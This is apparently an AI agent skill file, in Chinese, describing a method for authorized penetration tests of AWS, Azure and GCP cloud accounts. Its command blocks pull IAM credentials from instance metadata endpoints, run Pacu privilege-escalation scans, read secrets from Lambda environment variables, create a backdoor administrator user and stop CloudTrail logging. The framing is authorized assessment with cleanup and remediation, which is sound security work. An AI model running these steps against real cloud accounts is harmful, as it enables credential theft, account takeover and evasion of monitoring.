---
name: cszh-conducting-cloud-penetration-testing
description: 本 skill 概述了对 AWS、Azure 和 GCP 云环境进行授权渗透测试的方法论。
---

> 本技能源自中文网络安全技能库 killvxk/cybersecurity-skills-zh（上游目录 conducting-cloud-penetration-testing），正文按中文原文照录。

**这个技能干什么**：本 skill 概述了对 AWS、Azure 和 GCP 云环境进行授权渗透测试的方法论。

**什么时候用**：需要按上游中文方法论执行「conducting-cloud-penetration-testing」对应任务时加载本技能。

**关键工具**：见正文各章节列出的命令与工具清单。

# 进行云渗透测试

## 适用场景

- 在生产部署前对云环境进行授权安全评估时
- 重大架构变更或迁移后验证云安全控制措施时
- 合规要求规定对云基础设施进行年度渗透测试时
- 通过模拟真实的云攻击场景测试事件响应准备度时
- 评估跨多账户或多云环境的横向移动风险时

**不适用于**：对云账户进行未授权测试、测试云提供商基础设施本身（已由共享责任模型覆盖），或未经云提供商明确批准的 DDoS 模拟。

## 前置条件

- 云账户所有者的书面授权和范围定义文件
- AWS、Azure 或 GCP 渗透测试策略确认（AWS 大多数服务不再需要预先审批）
- 隔离测试账户或明确范围的生产账户（含紧急访问程序）
- 已安装云专用攻击工具：Pacu（AWS）、ScoutSuite、Prowler、CloudFox
- 用于发现分类的 MITRE ATT&CK 云矩阵

## 工作流程

### 步骤 1：定义范围和交战规则

基于共享责任模型建立测试边界。客户负责测试配置、IAM 策略、应用安全和数据保护。云提供商管理物理基础设施、虚拟机管理程序和托管服务内部组件。

```
云渗透测试范围文档
=======================================
目标: AWS 账户 123456789012（生产环境）
测试窗口: 2025-02-24 08:00 UTC 至 2025-02-28 18:00 UTC
授权: 由 CISO 签署，日期 2025-02-20

测试范围内:
  - IAM 用户、角色、策略和跨账户信任
  - EC2 实例、安全组和网络 ACL
  - S3 存储桶策略和数据访问控制
  - Lambda 函数、API Gateway 端点
  - RDS/DynamoDB 访问控制和加密
  - EKS 集群 RBAC 和网络策略
  - CloudTrail、Config 和监控空白

测试范围外:
  - AWS 托管服务内部（RDS 引擎、Lambda 运行时）
  - DDoS 攻击或容量测试
  - 物理基础设施或虚拟机管理程序攻击
  - 对 AWS 支持进行社会工程

紧急联系: security-ops@company.com, +1-555-0199
```

### 步骤 2：侦察和云枚举

使用云专用工具枚举攻击面：暴露的服务、公共 IP、S3 存储桶、IAM 配置和元数据端点。

```bash
# ScoutSuite 多云评估
scout suite aws --profile target-account --report-dir ./scout-report

# Prowler 全面 AWS 安全评估
prowler aws -M json-ocsf -o ./prowler-output --profile target-account

# CloudFox 用于识别权限提升路径
cloudfox aws --profile target-account all-checks

# 枚举公开 S3 存储桶
for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
  aws s3api get-bucket-policy-status --bucket $bucket 2>/dev/null | grep -q "true" && echo "PUBLIC: $bucket"
done

# 检查 IMDS v1（易受 SSRF 攻击）
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].[InstanceId,MetadataOptions.HttpTokens]' \
  --output table
```

### 步骤 3：IAM 权限提升测试

使用 Pacu 识别并利用 IAM 错误配置，从低权限起点提升到管理员访问权限。

```bash
# 初始化 Pacu 会话
pacu

# 设置窃取或测试凭据
set_keys --key-alias test-creds

# 运行 IAM 枚举模块
run iam__enum_users_roles_policies_groups
run iam__enum_permissions

# 检查权限提升路径
run iam__privesc_scan

# 需测试的常见提升路径:
# 1. iam:CreatePolicyVersion - 创建具有管理员访问权限的新策略版本
# 2. iam:AttachUserPolicy - 将 AdministratorAccess 附加到自身
# 3. iam:PassRole + lambda:CreateFunction - 创建带管理员角色的 Lambda
# 4. iam:PassRole + ec2:RunInstances - 启动带管理员实例配置文件的 EC2
# 5. sts:AssumeRole - 无 MFA 条件的跨账户角色假设
```

### 步骤 4：SSRF 到云元数据服务利用

测试 Web 应用程序是否存在服务端请求伪造（Server-Side Request Forgery，SSRF）漏洞，这些漏洞可访问位于 169.254.169.254 的实例元数据服务（Instance Metadata Service，IMDS），以窃取 IAM 角色凭据。

```bash
# 测试 IMDS v1 访问（无需令牌）
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 测试 IMDS v2（需要令牌 - 更安全）
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure IMDS 等效接口
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP 元数据服务
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### 步骤 5：横向移动和数据访问

测试跨账户角色假设、VPC 对等连接和共享资源访问，以绘制横向移动机会图。

```bash
# 枚举跨账户角色信任
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS!=`null`]].[RoleName,Arn]' --output table

# 测试跨账户假设
aws sts assume-role \
  --role-arn arn:aws:iam::987654321098:role/CrossAccountRole \
  --role-session-name pentest-session

# 使用窃取的凭据枚举可访问的 S3 数据
aws s3 ls --recursive s3://target-bucket/ --summarize

# 检查 Lambda 环境变量中的密钥
aws lambda list-functions --query 'Functions[*].[FunctionName]' --output text | while read fn; do
  aws lambda get-function-configuration --function-name "$fn" \
    --query 'Environment.Variables' --output json 2>/dev/null
done
```

### 步骤 6：持久化和检测规避测试

测试组织的监控是否能检测持久化机制，例如新 IAM 用户、访问密钥、Lambda 后门或禁用 CloudTrail。

```bash
# 测试: 创建后门 IAM 用户（仅限授权测试）
aws iam create-user --user-name pentest-backdoor
aws iam create-access-key --user-name pentest-backdoor
aws iam attach-user-policy --user-name pentest-backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 测试: 禁用 CloudTrail（验证 GuardDuty 告警）
aws cloudtrail stop-logging --name management-trail

# 测试: 创建 Lambda 用于持久化（仅限授权测试）
# 验证: GuardDuty 是否生成 Stealth:IAMUser/CloudTrailLoggingDisabled?
# 验证: Security Hub 是否对新管理员用户发出告警?

# 清理: 测试后删除所有持久化产物
aws iam delete-access-key --user-name pentest-backdoor --access-key-id AKIAEXAMPLE
aws iam detach-user-policy --user-name pentest-backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-user --user-name pentest-backdoor
aws cloudtrail start-logging --name management-trail
```

### 步骤 7：按 MITRE ATT&CK 映射报告发现

记录所有发现，映射到 MITRE ATT&CK 云矩阵，包含严重性、概念验证、业务影响和修复建议。

## 核心概念

| 术语 | 定义 |
|------|------|
| 共享责任模型（Shared Responsibility Model） | 云安全框架，提供商负责保护基础设施，客户负责保护数据、配置和访问控制 |
| IMDS | 实例元数据服务（Instance Metadata Service），位于 169.254.169.254，提供实例身份、凭据和配置数据；IMDSv2 需要基于令牌的访问 |
| 权限提升（Privilege Escalation） | 利用 IAM 错误配置，从有限权限提升到云账户内的管理员访问权限 |
| 横向移动（Lateral Movement） | 使用被入侵的凭据或信任关系访问其他账户、VPC 或云提供商中的资源 |
| Pacu | 开源 AWS 利用框架，用于渗透测试，提供枚举、提权和持久化模块 |
| ScoutSuite | 多云安全审计工具，收集配置数据并生成含风险发现的 HTML 报告 |
| MITRE ATT&CK Cloud | 云环境专用的对手战术和技术矩阵，包括初始访问、执行、持久化和数据渗出 |

## 工具与系统

- **Pacu**：专注于 AWS 的利用框架，包含 IAM 枚举、权限提升和持久化测试模块
- **ScoutSuite**：多云（AWS、Azure、GCP）安全审计工具，从 API 数据收集生成综合风险报告
- **CloudFox**：AWS 和 Azure 枚举工具，用于识别攻击路径、权限提升向量和数据访问机会
- **Prowler**：开源云安全评估工具，包含 AWS、Azure 和 GCP 的 300+ 项检查
- **Cartography**：基于 Neo4j 的工具，绘制云资源之间的关系以进行可视化攻击路径分析

## 常见场景

### 场景：Web 应用程序中的 SSRF 导致完整账户沦陷

**场景背景**：渗透测试人员在运行 IMDSv1 的 EC2 实例上托管的 Web 应用程序中发现 SSRF 漏洞。该实例具有拥有广泛 S3 和 Lambda 权限的 IAM 角色。

**方法**：
1. 利用 SSRF 访问 http://169.254.169.254/latest/meta-data/iam/security-credentials/<角色名>
2. 提取临时 IAM 凭据（AccessKeyId、SecretAccessKey、SessionToken）
3. 使用凭据枚举可访问的 S3 存储桶并下载敏感数据
4. 检查角色是否具有 iam:PassRole + lambda:CreateFunction 以提升到管理员权限
5. 记录从 SSRF 到账户级沦陷的完整攻击链
6. 建议：强制使用 IMDSv2，缩小 IAM 角色范围，添加阻止应用层访问 IMDS 的 VPC 端点策略

**常见陷阱**：未单独测试 IMDSv2 和 IMDSv1 强制执行会给出不完整的结果。未清理测试产物（后门用户、Lambda 函数）会在参与结束后留下真实漏洞。

## 输出格式

```
云渗透测试报告
===============================
目标: AWS 账户 123456789012（生产环境）
测试周期: 2025-02-24 至 2025-02-28
方法论: MITRE ATT&CK Cloud + OWASP 云测试指南
测试人员: 安全团队 - 授权参与

执行摘要:
  从只读开发者凭据开始，评估在 3 小时内通过
  IAM 权限提升链实现了对生产账户的完整管理员访问。
  跨 7 个 ATT&CK 战术识别出 47 个发现。

严重发现:
[PT-001] 通过 iam:CreatePolicyVersion 的 IAM 权限提升
  ATT&CK: T1098.001（账户操控：附加云凭据）
  严重程度: 严重
  起始点: 具有 iam:CreatePolicyVersion 权限的开发者角色
  影响: 对所有账户资源的完整管理员访问
  证据: 创建了向测试角色授予 iam:* 和 s3:* 的策略版本
  修复: 从开发者角色中删除 iam:CreatePolicyVersion，添加权限边界

[PT-002] SSRF 到 IMDS 凭据窃取
  ATT&CK: T1552.005（不安全凭据：云实例元数据 API）
  严重程度: 严重
  起始点: URL 参数易受 SSRF 攻击的 Web 应用程序
  影响: 提取了具有 S3 和 Lambda 访问权限的 IAM 角色凭据
  修复: 强制使用 IMDSv2，应用 WAF SSRF 规则，限制 IAM 角色范围

按 MITRE ATT&CK 战术划分的发现摘要:
  初始访问:     4 个发现
  执行:         3 个发现
  持久化:       6 个发现
  权限提升:     8 个发现（3 个严重）
  防御规避:     5 个发现
  凭据访问:     7 个发现
  发现:        14 个发现
  总计:        47 个发现
```
